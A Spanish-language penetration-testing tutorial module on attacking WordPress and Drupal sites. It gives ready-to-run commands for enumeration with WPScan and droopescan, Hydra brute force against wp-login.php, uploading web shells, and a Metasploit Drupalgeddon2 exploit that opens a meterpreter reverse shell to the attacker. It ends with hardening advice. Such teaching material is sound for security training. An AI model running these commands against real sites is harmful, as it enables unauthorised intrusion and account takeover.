
# 🛠️ Hacking en Entornos CMS (WordPress y Drupal)

Los CMS (Content Management Systems) como WordPress y Drupal son objetivos frecuentes en pruebas de penetración debido a su popularidad y extensibilidad. Este módulo cubre técnicas de reconocimiento, explotación y post-explotación en estos entornos.

---

## 🧱 Hacking en Entornos WordPress – Parte 1

### 🔍 Enumeración con WPScan:
```bash
wpscan --url http://target.com --enumerate u,vp,vt,tt
```

Esto permite obtener:

- Usuarios del sistema
- Plugins instalados
- Temas activos
- Versiones con vulnerabilidades conocidas

---

## 🚪 Hacking en Entornos WordPress – Parte 2

### 🔧 Explotación:

- Plugins vulnerables: busca exploits específicos en Exploit-DB.
- Panel de login: fuerza bruta con Hydra:
```bash
hydra -l admin -P rockyou.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=error"
```

- Upload maliciosos: sube shells si el plugin/tema lo permite.

---

## 🧱 Hacking en Entornos Drupal – Parte 1

### 🔎 Enumeración:

```bash
droopescan scan drupal -u http://target.com
```

- Detecta módulos vulnerables
- Enumera versiones
- Identifica temas expuestos

---

## 🧨 Hacking en Entornos Drupal – Parte 2

### 📌 Explotación conocida (ej. Drupalgeddon2):

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS http://target.com
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 4444
run
```

> 💡 Asegúrate de que el objetivo sea vulnerable antes de lanzar este tipo de exploit.

---

📌 Buenas prácticas:

- Revisa los CVE recientes en plugins o módulos.
- Usa contraseñas complejas y 2FA en producción.
- Mantén los CMS y extensiones siempre actualizados.
- Restringe el acceso al panel de administración (IP o VPN).

---

📚 Recursos útiles:

- https://wpscan.com/
- https://www.drupal.org/security
- https://github.com/droope/droopescan
- https://www.exploit-db.com/

---

💡 “Donde hay un plugin, hay una posibilidad.”
